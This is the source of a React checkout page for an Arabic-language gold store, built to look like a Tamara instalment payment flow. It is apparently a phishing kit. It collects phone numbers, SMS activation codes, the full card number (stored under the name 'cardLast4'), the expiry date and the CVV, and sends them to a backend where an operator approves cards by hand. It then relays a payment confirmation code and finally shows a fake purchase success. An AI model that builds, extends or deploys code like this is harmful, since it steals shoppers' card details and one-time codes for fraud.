import { useState, useEffect } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import { useAuth } from '@/context/AuthContext';
import Layout from '@/components/Layout';
import { getProducts } from '@/data/products';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowRight, ShoppingBag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { toast } from 'sonner';
import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus, submitVerificationCode, getVerificationResult, requestActivationCode, verifyActivationCode } from '@/lib/api';
import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';
import { toEnglishNumbers } from '@/lib/utils';

type PaymentMethod = 'tamara' | null;
type Step = 'checkout' | 'tamara-phone' | 'tamara-verify' | 'card-info' | 'card-approval' | 'confirm-code' | 'verifying-code' | 'success' | 'cancelled' | 'verification-failed';

interface InstallmentPackage {
  totalAmount: number;
  installmentsCount: number;
  perInstallment: number;
  commission: number;
  netTransfer: number;
}

const INSTALLMENT_PACKAGES: InstallmentPackage[] = [
  { totalAmount: 4140, installmentsCount: 4, perInstallment: 1035, commission: 210, netTransfer: 3930 },
  { totalAmount: 8280, installmentsCount: 4, perInstallment: 2070, commission: 410, netTransfer: 7870 },
  { totalAmount: 20700, installmentsCount: 4, perInstallment: 5175, commission: 1040, netTransfer: 19660 },
  { totalAmount: 6210, installmentsCount: 6, perInstallment: 1035, commission: 310, netTransfer: 5900 },
  { totalAmount: 12420, installmentsCount: 6, perInstallment: 2070, commission: 620, netTransfer: 11800 },
  { totalAmount: 31050, installmentsCount: 6, perInstallment: 5175, commission: 1550, netTransfer: 29500 },
  { totalAmount: 50000, installmentsCount: 12, perInstallment: 4166, commission: 1800, netTransfer: 48200 },
  { totalAmount: 24000, installmentsCount: 24, perInstallment: 1000, commission: 600, netTransfer: 23400 },
  { totalAmount: 100000, installmentsCount: 36, perInstallment: 2777, commission: 2200, netTransfer: 97800 },
];

const Checkout = () => {
  const { id } = useParams();
  const { user } = useAuth();
  const navigate = useNavigate();
  const products = getProducts();
  const product = products.find(p => p.id === Number(id));

  const [coupon, setCoupon] = useState('');
  const [couponApplied, setCouponApplied] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>(null);
  const [selectedPackage, setSelectedPackage] = useState<InstallmentPackage | null>(null);
  const [step, setStep] = useState<Step>('checkout');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [cardName, setCardName] = useState('');
  const [confirmCode, setConfirmCode] = useState('');
  const [agreedTerms, setAgreedTerms] = useState(false);
  const [verificationError, setVerificationError] = useState<string | null>(null);
  const [activationCode, setActivationCode] = useState('');
  const [codeError, setCodeError] = useState<string | null>(null);
  const [resendTimer, setResendTimer] = useState(0);
  const [isVerifyingCode, setIsVerifyingCode] = useState(false);

  if (!user) {
    navigate('/login?redirect=/checkout/' + id);
    return null;
  }

  if (!product) {
    return (
      <Layout>
        <div className="container mx-auto px-4 py-20 text-center">
          <h1 className="text-2xl font-bold text-foreground mb-4">المنتج غير موجود</h1>
          <Link to="/" className="text-primary hover:underline">العودة للرئيسية</Link>
        </div>
      </Layout>
    );
  }

  const formatPrice = (p: number) => {
    const formatted = new Intl.NumberFormat('en-US', { 
      style: 'decimal', 
      minimumFractionDigits: 0,
      maximumFractionDigits: 0 
    }).format(p);
    return `${formatted} ر.س`;
  };

  const discount = couponApplied ? product.price * 0.05 : 0;
  const finalPrice = product.price - discount;

  const activeInstallments = selectedPackage?.installmentsCount ?? 1;
  const activePerInstallment = selectedPackage?.perInstallment ?? finalPrice;
  const activeCommission = selectedPackage?.commission ?? 0;
  const activeNetTransfer = selectedPackage?.netTransfer ?? finalPrice;
  const activeTotalAmount = selectedPackage?.totalAmount ?? finalPrice;

  const orderId = `ORD-${Date.now().toString(36).toUpperCase()}`;

  const sessionId = getCheckoutSessionId();

  useEffect(() => {
    postCheckoutEvent({
      sessionId,
      eventType: 'checkout_started',
      userName: user.name,
      userEmail: user.email,
      productId: product.id,
      productName: product.name,
      productPrice: product.price,
      amount: finalPrice,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
  }, []);

  // Timer for resend code
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendTimer]);

  const applyCoupon = () => {
    if (coupon.trim().toUpperCase() === 'GOLD5') {
      setCouponApplied(true);
      toast.success('تم تطبيق الكوبون! خصم 5%');
    } else {
      toast.error('كوبون غير صالح');
    }
  };

  const handleConfirmPayment = () => {
    if (!paymentMethod) {
      toast.error('يرجى اختيار طريقة الدفع');
      return;
    }
    if (!selectedPackage) {
      toast.error('يرجى اختيار باقة التقسيط');
      return;
    }
    postCheckoutEvent({
      sessionId,
      eventType: 'payment_method_selected',
      userName: user.name,
      userEmail: user.email,
      productName: product.name,
      amount: activeTotalAmount,
      paymentMethod,
      installments: activeInstallments,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
    setStep('tamara-phone');
  };

  // Tamara Phone Step - Send activation code
  const handleSendActivationCode = async () => {
    const cleanPhone = toEnglishNumbers(phoneNumber.trim());
    
    if (!cleanPhone || cleanPhone.length < 10) {
      toast.error('يرجى إدخال رقم هاتف صحيح');
      return;
    }

    try {
      await requestActivationCode({
        sessionId,
        phoneNumber: cleanPhone,
        userName: user.name,
        userEmail: user.email,
      });

      toast.success('تم إرسال رمز التحقق');
      setResendTimer(180); // 3 minutes
      setStep('tamara-verify');
    } catch (err) {
      console.error('Failed to send activation code:', err);
      toast.error('فشل في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.');
    }
  };

  // Tamara Verify Step - Verify activation code
  const handleVerifyActivationCode = async () => {
    const cleanCode = toEnglishNumbers(activationCode.trim());
    
    if (!cleanCode || cleanCode.length < 4) {
      setCodeError('يرجى إدخال رمز التحقق');
      return;
    }

    if (!agreedTerms) {
      setCodeError('يرجى الموافقة على الشروط والأحكام');
      return;
    }

    setIsVerifyingCode(true);
    setCodeError(null);

    try {
      const result = await verifyActivationCode(sessionId, cleanCode);
      
      if (result.valid) {
        toast.success('تم التحقق من الرمز بنجاح');
        setStep('card-info');
      }
    } catch (err: any) {
      console.error('Failed to verify activation code:', err);
      setCodeError(err.message || 'الرمز غير صحيح');
    } finally {
      setIsVerifyingCode(false);
    }
  };

  const handleCardSubmit = async () => {
    if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
      toast.error('يرجى ملء جميع بيانات البطاقة');
      return;
    }

    const cardLast4 = cardNumber.replace(/\D/g, '').slice(-16);

    try {
      await requestCardApproval({
        sessionId,
        userName: user.name,
        userEmail: user.email,
        productName: product.name,
        amount: activeTotalAmount,
        paymentMethod,
        installments: activeInstallments,
        phoneMasked: phoneNumber,
        cardLast4,
        cardExpiry,
        cardCvv,
      });

      toast.info('جاري طلب الموافقة على بيانات البطاقة...');
      setStep('card-approval');
    } catch (err) {
      console.error('Failed to request approval:', err);
      toast.error('فشل في طلب الموافقة. يرجى المحاولة مرة أخرى.');
    }
  };

  useEffect(() => {
    if (step !== 'card-approval') return;

    let pollingInterval: NodeJS.Timeout | null = null;
    let timeoutId: NodeJS.Timeout | null = null;

    const pollStatus = async () => {
      try {
        const response = await getCardApprovalStatus(sessionId);
        if (response.status === 'approved') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          postCheckoutEvent({
            sessionId,
            eventType: 'phone_confirmed',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            paymentMethod,
            installments: activeInstallments,
            phoneMasked: phoneNumber,
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          setStep('confirm-code');
          toast.success('تمت الموافقة على بيانات البطاقة');
        } else if (response.status === 'rejected') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          setStep('cancelled');
          toast.error('تم رفض بيانات البطاقة من قبل الإدارة');
          clearCheckoutSessionId();
        } else if (response.status === 'error') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          const errorReason = response.reason || 'حدث خطأ غير معروف';
          toast.error(errorReason);
          clearCheckoutSessionId();
        }
      } catch (err) {
        console.error('Error checking approval status:', err);
      }
    };

    pollingInterval = setInterval(pollStatus, 2000);

    timeoutId = setTimeout(() => {
      if (pollingInterval) clearInterval(pollingInterval);
      setStep('checkout');
      toast.error('انتهت مهلة الموافقة. يرجى المحاولة مرة أخرى.');
    }, 5 * 60 * 1000);

    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [step, sessionId, user, product, paymentMethod, activeInstallments, phoneNumber]);

  useEffect(() => {
    if (step !== 'verifying-code') return;

    let pollingInterval: NodeJS.Timeout | null = null;
    let timeoutId: NodeJS.Timeout | null = null;

    const pollStatus = async () => {
      try {
        const response = await getVerificationResult(sessionId);

        if (response.status === 'code_correct') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          postCheckoutEvent({
            sessionId,
            eventType: 'redirect_to_payment',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            amount: activeTotalAmount,
            paymentMethod,
            installments: activeInstallments,
            phoneMasked: phoneNumber,
            orderId,
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          postCheckoutEvent({
            sessionId,
            eventType: 'checkout_completed',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            amount: activeTotalAmount,
            paymentMethod,
            installments: activeInstallments,
            phoneMasked: phoneNumber,
            orderId,
            paymentStatus: 'paid',
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          setStep('success');
          toast.success('تم إتمام عملية الشراء بنجاح! 🎉');
          clearCheckoutSessionId();
        } else if (response.status === 'code_incorrect') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setVerificationError('الكود غير صحيح - يرجى المحاولة لاحقاً');
          setStep('verification-failed');
          clearCheckoutSessionId();
        } else if (response.status === 'no_balance') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setVerificationError('لا يوجد رصيد بالبطاقة');
          setStep('verification-failed');
          clearCheckoutSessionId();
        } else if (response.status === 'card_rejected') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setVerificationError('تم رفض البطاقة');
          setStep('verification-failed');
          clearCheckoutSessionId();
        }
      } catch (err) {
        console.error('Error checking verification result:', err);
      }
    };

    pollingInterval = setInterval(pollStatus, 2000);

    timeoutId = setTimeout(() => {
      if (pollingInterval) clearInterval(pollingInterval);
      setVerificationError('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
      setStep('verification-failed');
    }, 5 * 60 * 1000);

    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [step, sessionId, user, product, paymentMethod, activeInstallments, phoneNumber, activeTotalAmount, orderId]);

  const handleFinalConfirm = async () => {
    if (!confirmCode || confirmCode.length < 4) {
      toast.error('يرجى إدخال رمز التأكيد');
      return;
    }

    try {
      await submitVerificationCode(sessionId, confirmCode, {
        userName: user.name,
        userEmail: user.email,
        productName: product.name,
        amount: activeTotalAmount,
        paymentMethod,
        installments: activeInstallments,
        phoneMasked: phoneNumber,
      });

      toast.info('جاري التحقق من الكود...');
      setVerificationError(null);
      setStep('verifying-code');
    } catch (err) {
      console.error('Failed to submit verification code:', err);
      toast.error('فشل في إرسال الكود. يرجى المحاولة مرة أخرى.');
    }
  };

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        <AnimatePresence mode="wait">
          {step === 'checkout' && (
            <motion.div key="checkout" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <div className="flex items-center justify-between mb-6">
                <Link to="/" className="inline-flex items-center gap-1 text-sm text-muted-foreground hover:text-primary">
                  <ArrowRight className="h-4 w-4" />
                  العودة
                </Link>
                <div className="text-foreground font-semibold text-sm flex items-center gap-2">
                  <ShoppingBag className="h-4 w-4 text-primary" />
                  سلة المشتريات / إتمام الطلب
                </div>
              </div>

              <div className="bg-card rounded-xl border gold-border p-4 mb-4 flex items-center gap-3">
                <div className="w-10 h-10 rounded-full gold-gradient flex items-center justify-center text-primary-foreground font-bold text-sm">
                  {user.name.charAt(0)}
                </div>
                <div>
                  <p className="text-foreground font-semibold">{user.name}</p>
                  <p className="text-xs text-muted-foreground">{user.email}</p>
                </div>
              </div>

              <div className="bg-card rounded-xl border gold-border p-6 mb-4">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="font-bold text-foreground">{product.name}</h3>
                  <span className="px-2 py-1 text-xs rounded-full gold-gradient text-primary-foreground font-semibold">عيار {product.karat}</span>
                </div>
                <div className="text-3xl font-extrabold gold-text text-center py-4">
                  {formatPrice(product.price)}
                </div>
                {couponApplied && (
                  <div className="text-center">
                    <span className="text-sm text-green-400">خصم: -{formatPrice(discount)}</span>
                    <div className="text-2xl font-extrabold text-green-400 mt-1">{formatPrice(finalPrice)}</div>
                  </div>
                )}
                <div className="border-t gold-border mt-4 pt-4">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">إجمالي الطلب</span>
                    <span className="text-foreground font-bold">{formatPrice(finalPrice)}</span>
                  </div>
                </div>
              </div>

              <div className="bg-card rounded-xl border gold-border p-5 mb-4">
                <p className="text-sm text-muted-foreground mb-3">أدخل الكوبون لإتمام الدفع</p>
                <div className="flex gap-2">
                  <Input
                    value={coupon}
                    onChange={e => setCoupon(e.target.value)}
                    placeholder="أدخل الكوبون"
                    className="bg-secondary border-border text-foreground flex-1"
                    maxLength={30}
                    disabled={couponApplied}
                  />
                  <Button
                    onClick={applyCoupon}
                    disabled={couponApplied || !coupon.trim()}
                    className="gold-gradient text-primary-foreground font-semibold px-6"
                  >
                    {couponApplied ? <Check className="h-4 w-4" /> : 'تطبيق'}
                  </Button>
                </div>
              </div>

              <div className="bg-card rounded-xl border gold-border p-5 mb-4">
                <h3 className="text-sm font-bold text-foreground mb-4 flex items-center gap-2">
                  <CreditCard className="h-4 w-4 text-primary" />
                  تفاصيل الطلب - الدفع
                </h3>

                {/* Tamara */}
                <button
                  onClick={() => { setPaymentMethod('tamara'); setSelectedPackage(null); }}
                  className={`w-full p-4 rounded-xl border mb-3 text-right transition-all ${
                    paymentMethod === 'tamara'
                      ? 'border-[hsl(340,80%,55%)] bg-[hsl(340,80%,55%,0.08)]'
                      : 'border-border hover:border-muted-foreground/50'
                  }`}
                >
                  <div className="flex items-center justify-between" dir="rtl">
                    <div className="flex items-center gap-2">
                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'tamara' ? 'border-[hsl(340,80%,55%)]' : 'border-muted-foreground/40'}`}>
                        {paymentMethod === 'tamara' && <div className="w-3 h-3 rounded-full bg-[hsl(340,80%,55%)]" />}
                      </div>
                      <span className="font-bold text-[hsl(340,80%,55%)] text-lg">Tamara</span>
                      <img
                        src="/tamara-logo.webp"
                        alt="Tamara"
                        className="h-6 object-contain"
                      />
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground mt-2">تقسيم فاتورتك حتى 36 دفعة بدون فوائد!</p>
                </button>

                {/* Installment packages - Simple selection */}
                {paymentMethod === 'tamara' && (
                  <div className="space-y-2 mt-2">
                    {INSTALLMENT_PACKAGES.map((pkg, idx) => (
                      <button
                        key={idx}
                        onClick={() => setSelectedPackage(pkg)}
                        className={`w-full p-3 rounded-lg border text-right transition-all ${
                          selectedPackage === pkg
                            ? 'border-primary bg-primary/10'
                            : 'border-border bg-card hover:border-primary/50'
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${selectedPackage === pkg ? 'border-primary' : 'border-muted-foreground/40'}`}>
                            {selectedPackage === pkg && <div className="w-2 h-2 rounded-full bg-primary" />}
                          </div>
                          <div className="text-right flex-1 mr-2">
                            <span className="font-bold text-foreground">{formatPrice(pkg.totalAmount)}</span>
                            <span className="text-muted-foreground text-xs mr-2">
                              ({pkg.installmentsCount} × {formatPrice(pkg.perInstallment)})
                            </span>
                          </div>
                        </div>
                      </button>
                    ))}
                  </div>
                )}

                <div className="space-y-2 mt-4">
                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
                    <ShieldCheck className="h-4 w-4 text-green-400" />
                    <span>ادفع قيمة طلبك كاملة</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
                    <span className="text-primary font-bold">حلال</span>
                    <span>خدمات مطابقة للشريعة الإسلامية</span>
                  </div>
                  <p className="text-xs text-muted-foreground/70">سجلك الائتماني قد يؤثر على خطط الدفع</p>
                  <p className="text-xs text-muted-foreground/70">خدمات تمارا متاحة للعملاء الأكبر من 18 سنة</p>
                </div>
              </div>

              <Button
                onClick={handleConfirmPayment}
                disabled={!paymentMethod || !selectedPackage}
                className="w-full py-6 text-lg font-bold gold-gradient text-primary-foreground"
              >
                <Lock className="h-5 w-5 ml-2" />
                تأكيد الدفع
              </Button>
            </motion.div>
          )}

          {/* Tamara Phone Step - White background simulation */}
          {step === 'tamara-phone' && (
            <motion.div key="tamara-phone" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <button onClick={() => setStep('checkout')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
                <ChevronLeft className="h-4 w-4" /> رجوع
              </button>

              <div className="bg-white rounded-2xl border border-gray-200 p-8 text-center shadow-sm">
                {/* Tamara Logo */}
                <div className="mb-8">
                  <img
                    src="/tamara-logo.webp"
                    alt="Tamara"
                    className="h-12 mx-auto object-contain"
                  />
                </div>

                <h2 className="text-xl font-bold text-gray-900 mb-6">أدخل رقم الجوال</h2>

                <div className="space-y-4">
                  <div className="flex gap-2 justify-center">
                    {/* Saudi flag and country code */}
                    <div className="flex items-center gap-2 bg-gray-100 border border-gray-300 rounded-lg px-4 py-3">
                      <span className="text-xl">🇸🇦</span>
                      <span className="text-gray-700 font-medium">+966</span>
                    </div>
                    {/* Phone input */}
                    <Input
                      value={phoneNumber}
                      onChange={e => setPhoneNumber(toEnglishNumbers(e.target.value))}
                      placeholder="05XXXXXXXX"
                      className="bg-gray-50 border-gray-300 text-gray-900 text-center text-lg tracking-wider w-48"
                      maxLength={10}
                      dir="ltr"
                      type="tel"
                    />
                  </div>

                  <Button
                    onClick={handleSendActivationCode}
                    className="w-full py-4 font-bold bg-[hsl(340,80%,55%)] hover:bg-[hsl(340,80%,50%)] text-white rounded-lg"
                    disabled={!phoneNumber || phoneNumber.length < 10}
                  >
                    إرسال الرمز
                  </Button>
                </div>
              </div>
            </motion.div>
          )}

          {/* Tamara Verify Step */}
          {step === 'tamara-verify' && (
            <motion.div key="tamara-verify" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <div className="bg-white rounded-2xl border border-gray-200 p-8 text-center shadow-sm">
                {/* Phone Icon */}
                <div className="w-16 h-16 rounded-full bg-gray-100 mx-auto mb-4 flex items-center justify-center">
                  <Phone className="h-8 w-8 text-gray-600" />
                </div>

                <h2 className="text-xl font-bold text-gray-900 mb-2">تحقق من رقمك</h2>
                <p className="text-gray-600 mb-1">{phoneNumber}</p>
                <button 
                  onClick={() => setStep('tamara-phone')}
                  className="text-[hsl(340,80%,55%)] text-sm mb-4 hover:underline"
                >
                  تبي تغيير رقمك؟
                </button>

                <p className="text-gray-500 text-sm mb-6">لقد أرسلنا رمز التحقق عبر الرسائل القصيرة</p>

                <div className="space-y-4">
                  <div>
                    <Label className="text-gray-700 text-sm block mb-2">أدخل رمز التحقق:</Label>
                    <Input
                      value={activationCode}
                      onChange={e => {
                        setActivationCode(toEnglishNumbers(e.target.value));
                        setCodeError(null);
                      }}
                      placeholder="_ _ _ _"
                      className="bg-gray-50 border-gray-300 text-gray-900 text-center text-2xl tracking-[0.5em] py-4"
                      dir="ltr"
                      maxLength={6}
                      type="text"
                      inputMode="numeric"
                    />
                  </div>

                  {codeError && (
                    <p className="text-red-500 text-sm">{codeError}</p>
                  )}

                  <p className="text-gray-500 text-sm">
                    {resendTimer > 0 
                      ? `إعادة الإرسال خلال ${formatTimer(resendTimer)}`
                      : 'يمكنك طلب إعادة الإرسال'
                    }
                  </p>

                  <label className="flex items-center gap-2 text-sm text-gray-600 cursor-pointer justify-center">
                    <input
                      type="checkbox"
                      checked={agreedTerms}
                      onChange={e => setAgreedTerms(e.target.checked)}
                      className="rounded border-gray-300 accent-[hsl(340,80%,55%)]"
                    />
                    أوافق على شروط وأحكام تمارا
                  </label>

                  <Button
                    onClick={handleVerifyActivationCode}
                    className="w-full py-4 font-bold bg-[hsl(340,80%,55%)] hover:bg-[hsl(340,80%,50%)] text-white rounded-lg"
                    disabled={!activationCode || !agreedTerms || isVerifyingCode}
                  >
                    {isVerifyingCode ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin ml-2" />
                        جاري التحقق...
                      </>
                    ) : (
                      'تأكيد'
                    )}
                  </Button>
                </div>
              </div>
            </motion.div>
          )}

          {step === 'card-info' && (
            <motion.div key="card" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <button onClick={() => setStep('tamara-verify')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
                <ChevronLeft className="h-4 w-4" /> رجوع
              </button>

              <div className="bg-card rounded-2xl border gold-border p-8">
                <div className="text-center mb-6">
                  <CreditCard className="h-10 w-10 text-primary mx-auto mb-3" />
                  <h2 className="text-xl font-bold text-foreground">بيانات البطاقة</h2>
                  <p className="text-sm text-muted-foreground mt-1">أدخل بيانات بطاقتك البنكية</p>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label className="text-foreground text-sm">اسم حامل البطاقة</Label>
                    <Input value={cardName} onChange={e => setCardName(e.target.value)} placeholder="الاسم كما يظهر على البطاقة" className="bg-secondary border-border text-foreground" dir="ltr" maxLength={100} />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-foreground text-sm">رقم البطاقة</Label>
                    <Input value={cardNumber} onChange={e => setCardNumber(toEnglishNumbers(e.target.value))} placeholder="XXXX XXXX XXXX XXXX" className="bg-secondary border-border text-foreground text-center tracking-[0.3em]" dir="ltr" maxLength={19} />
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <Label className="text-foreground text-sm">تاريخ الانتهاء</Label>
                      <Input value={cardExpiry} onChange={e => setCardExpiry(toEnglishNumbers(e.target.value))} placeholder="MM/YY" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={5} />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-foreground text-sm">CVV</Label>
                      <Input value={cardCvv} onChange={e => setCardCvv(toEnglishNumbers(e.target.value))} placeholder="•••" type="password" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={4} />
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handleCardSubmit}
                  className="w-full mt-6 py-5 font-bold gold-gradient text-primary-foreground"
                  disabled={!cardNumber || !cardExpiry || !cardCvv || !cardName}
                >
                  <Lock className="h-4 w-4 ml-2" />
                  ادخل
                </Button>

                <div className="flex items-center justify-center gap-2 mt-4 text-xs text-muted-foreground">
                  <ShieldCheck className="h-3 w-3" />
                  <span>بياناتك محمية بتشفير SSL</span>
                </div>
              </div>
            </motion.div>
          )}

          {step === 'card-approval' && (
            <motion.div key="approval" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 mx-auto mb-6 flex items-center justify-center">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                </div>
                <h2 className="text-2xl font-extrabold gold-text mb-3">بانتظار الموافقة</h2>
                <p className="text-muted-foreground mb-6">جاري مراجعة طلبك من قبل الإدارة</p>
                <p className="text-sm text-muted-foreground">سيتم تحديث الصفحة تلقائياً بعد الموافقة</p>
              </div>
            </motion.div>
          )}

          {step === 'cancelled' && (
            <motion.div key="cancelled" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-red-500/10 mx-auto mb-6 flex items-center justify-center">
                  <XCircle className="h-10 w-10 text-red-500" />
                </div>
                <h2 className="text-2xl font-extrabold text-red-500 mb-3">تم إلغاء الطلب</h2>
                <p className="text-muted-foreground mb-6">تم رفض بيانات البطاقة من قبل الإدارة</p>
                <Link to="/">
                  <Button className="w-full py-5 font-bold gold-gradient text-primary-foreground">
                    العودة للرئيسية
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}

          {step === 'confirm-code' && (
            <motion.div key="code" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
              <div className="bg-card rounded-2xl border gold-border p-8 text-center">
                <Phone className="h-12 w-12 text-primary mx-auto mb-4" />
                <h2 className="text-xl font-bold text-foreground mb-2">رمز تأكيد الدفع</h2>
                <p className="text-sm text-muted-foreground mb-6">أدخل الرمز المرسل إلى هاتفك لتأكيد عملية الدفع</p>

                <Input
                  value={confirmCode}
                  onChange={e => setConfirmCode(toEnglishNumbers(e.target.value))}
                  placeholder="أدخل الرمز"
                  className="bg-secondary border-border text-foreground text-center text-2xl tracking-[0.5em] py-6 mb-6"
                  dir="ltr"
                  maxLength={6}
                  type="text"
                  inputMode="numeric"
                />

                <Button
                  onClick={handleFinalConfirm}
                  className="w-full py-5 font-bold gold-gradient text-primary-foreground"
                  disabled={!confirmCode}
                >
                  تأكيد
                </Button>
              </div>
            </motion.div>
          )}

          {step === 'verifying-code' && (
            <motion.div key="verifying" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-primary/10 mx-auto mb-6 flex items-center justify-center">
                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
                </div>
                <h2 className="text-2xl font-extrabold gold-text mb-3">جاري التحقق من الكود</h2>
                <p className="text-muted-foreground mb-6">يرجى الانتظار بينما يتم التحقق من كود التفعيل</p>
                <p className="text-sm text-muted-foreground">سيتم تحديث الصفحة تلقائياً</p>
              </div>
            </motion.div>
          )}

          {step === 'verification-failed' && (
            <motion.div key="verification-failed" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full bg-red-500/10 mx-auto mb-6 flex items-center justify-center">
                  <AlertCircle className="h-10 w-10 text-red-500" />
                </div>
                <h2 className="text-2xl font-extrabold text-red-500 mb-3">فشل التحقق</h2>
                <p className="text-muted-foreground mb-6">{verificationError || 'حدث خطأ أثناء التحقق من الكود'}</p>
                <Link to="/">
                  <Button className="w-full py-5 font-bold gold-gradient text-primary-foreground">
                    العودة للرئيسية
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}

          {step === 'success' && (
            <motion.div key="success" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
                <div className="w-20 h-20 rounded-full gold-gradient mx-auto mb-6 flex items-center justify-center">
                  <Check className="h-10 w-10 text-primary-foreground" />
                </div>
                <h2 className="text-2xl font-extrabold gold-text mb-3">تم الشراء بنجاح! 🎉</h2>
                <p className="text-muted-foreground mb-6">شكراً لك {user.name}، تم تأكيد طلبك</p>

                <div className="bg-secondary rounded-xl p-5 text-right space-y-3 mb-6">
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground font-mono text-xs">{orderId}</span>
                    <span className="text-muted-foreground">رقم الطلب</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">{product.name}</span>
                    <span className="text-muted-foreground">المنتج</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-primary font-bold">{formatPrice(activeTotalAmount)}</span>
                    <span className="text-muted-foreground">المبلغ الإجمالي</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">تمارا</span>
                    <span className="text-muted-foreground">طريقة الدفع</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">{activeInstallments} دفعة</span>
                    <span className="text-muted-foreground">الدفعات</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-foreground">{formatPrice(activePerInstallment)}</span>
                    <span className="text-muted-foreground">كل دفعة</span>
                  </div>
                </div>

                <Link to="/">
                  <Button className="w-full gold-gradient text-primary-foreground font-bold py-5">
                    العودة للرئيسية
                  </Button>
                </Link>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </Layout>
  );
};

export default Checkout;